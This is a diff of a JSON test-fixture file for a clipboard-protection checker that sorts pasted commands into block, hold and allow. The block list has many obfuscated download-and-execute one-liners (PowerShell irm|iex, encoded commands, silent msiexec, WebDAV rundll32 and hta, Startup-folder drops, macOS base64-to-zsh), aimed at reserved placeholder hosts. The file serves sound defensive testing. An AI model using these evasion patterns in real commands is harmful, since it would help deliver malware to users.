@@ -1,5 +1,5 @@
 {
-  "note": "Shared test commands for the JavaScript engine and the PowerShell checker. Malicious samples only use reserved, non-routable hosts (example.invalid, *.example, 203.0.113.0/24).",
+  "note": "Shared test commands for the JavaScript engine and the PowerShell checker. Expected verdicts: block = replace the clipboard and warn; hold = pause programmatic copies so the user can choose 'Copy anyway'; allow = do nothing. Malicious samples only use reserved, non-routable hosts (example.invalid, *.example, 203.0.113.0/24) and harmless payloads.",
   "block": {
     "curl + silent msiexec (incident shape)": "cmd /c curl -s -o %TEMP%\\S775.msi https://cloubflare.example.top/5 && msiexec /i %TEMP%\\S775.msi /qn",
     "powershell with fake reCAPTCHA comment": "powershell -w h -nop -c \"iex(irm https://203.0.113.7/a)\" # ✅ I am not a robot - reCAPTCHA Verification ID: 4821",
@@ -11,7 +11,22 @@
     "headless conhost": "conhost.exe --headless powershell -c \"irm https://203.0.113.5/s | iex\"",
     "rundll32 over WebDAV share": "rundll32 \\\\203.0.113.5@SSL\\dav\\x.dll,Entry",
     "string-split powershell download": "pow'+'ershell -w hidden -c \"iwr https://cdn.example.top/u -OutFile $env:TEMP\\u.exe; start $env:TEMP\\u.exe\"",
-    "space-padded decoy": "powershell -c \"irm https://example.invalid/x|iex\"                                                            ''Cloudflare human check''"
+    "space-padded decoy": "powershell -c \"irm https://example.invalid/x|iex\"                                                            ''Cloudflare human check''",
+    "powershell -en prefix of EncodedCommand, hidden": "powershell -w h -en ZQBjAGgAbwAgAHQAZQBzAHQA",
+    "powershell slash-prefixed parameters": "powershell /w h /enc ZQBjAGgAbwAgAHQAZQBzAHQA",
+    "powershell -EncodedCom partial parameter": "powershell -WindowStyle Hidden -EncodedCom ZQBjAGgAbwAgAHQAZQBzAHQA",
+    "powershell en-dash parameters": "powershell –w h –ec ZQBjAGgAbwAgAHQAZQBzAHQA",
+    "powershell -wi hidden abbreviation": "powershell -wi hidden -nop -c \"irm https://x.example.invalid/a | iex\"",
+    "powershell smart quotes": "powershell -w h -c “iex(irm https://x.example.top/a)”",
+    "8.3 short name powershell": "C:\\Windows\\System32\\WINDOW~1\\v1.0\\POWERS~1.EXE -w h -en ZQBjAGgAbwAgAHQAZQBzAHQA",
+    "ComSpec variable instead of cmd": "%ComSpec% /c curl -s -o %TEMP%\\a.exe https://x.example.invalid/a && %TEMP%\\a.exe",
+    "windir substring builds cmd": "%windir:~-7,1%md /c echo test",
+    "curl drops batch file into Startup folder": "curl -s -o \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.bat\" https://x.example.invalid/a",
+    "WebDAV UNC hta pasted in Run": "\\\\203.0.113.5@SSL\\DavWWWRoot\\verify.hta",
+    "format-operator iex and irm without scheme": "powershell -w h -c \"&('{1}{0}'-f'x','ie')(&('{0}{1}'-f'ir','m') cdn.example.invalid/a)\"",
+    "stealthy command padded with comment lines": "powershell -w h -c \"irm https://x.example.top/a|iex\"\n#\n#\n#\n#\n#\n#",
+    "macOS echo base64 decode to zsh": "echo ZWNobyB0ZXN0 | base64 -d | zsh",
+    "macOS curl to tmp, chmod, run": "cd /tmp && curl -so u https://cdn.example.invalid/a && chmod +x u && ./u"
   },
   "allow": {
     "npm install": "npm install react",
@@ -23,11 +38,30 @@
     "code with url": "const res = await fetch(\"https://api.example.com/v1/items\");",
     "sentence about captchas": "Please verify you are human by completing the CAPTCHA below.",
     "plain url": "https://www.example.com/article?id=42",
-    "curl API example": "curl https://api.github.com/users/octocat"
+    "curl API example": "curl https://api.github.com/users/octocat",
+    "winget install with dotted id": "winget install JanDeDobbeleer.OhMyPosh -s winget",
+    "wsl install": "wsl --install",
+    "git commit with verified comment": "git commit -m 'fix' # verified by human review",
+    "powershell AD lookup with identity comment": "powershell Get-ADUser jdoe # check identity",
+    "cmd ping with verify comment": "cmd /c ping 192.168.1.1 :: verify connectivity",
+    "bash pytest verify comment": "bash -c 'pytest -q' # verify tests",
+    "prose mentioning mshta": "mshta.exe is a Windows binary used to run HTA files.",
+    "password with carets": "Tr0ub4dor&3^x^y",
+    "batch substring syntax": "set x=%PATH:~0,10%",
+    "deploy comment mentioning Cloudflare": "npx wrangler deploy # deploy to Cloudflare",
+    "ping a private address": "ping 10.0.0.1"
   },
-  "warn": {
+  "hold": {
     "scoop installer": "irm https://get.scoop.sh | iex",
     "bun installer": "curl -fsSL https://bun.sh/install | bash",
-    "rustup installer": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
+    "rustup installer": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+    "scoop installer with verify comment": "irm get.scoop.sh | iex # Install Scoop, then verify with scoop --version",
+    "uv windows installer": "powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"",
+    "chocolatey installer": "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))",
+    "enterprise silent MSI from an internal file share": "msiexec /i \\\\fileserver\\deploy\\agent.msi /qn",
+    "homebrew installer": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
+    "curl to bash with verified comment": "curl -fsSL https://example.com/install.sh | bash # works on Ubuntu, verified",
+    "bash process substitution": "bash <(curl -fsSL https://x.example.invalid/a)",
+    "python urlopen one-liner": "python3 -c \"import urllib.request as u; exec(u.urlopen('https://x.example.invalid/a').read())\""
   }
 }
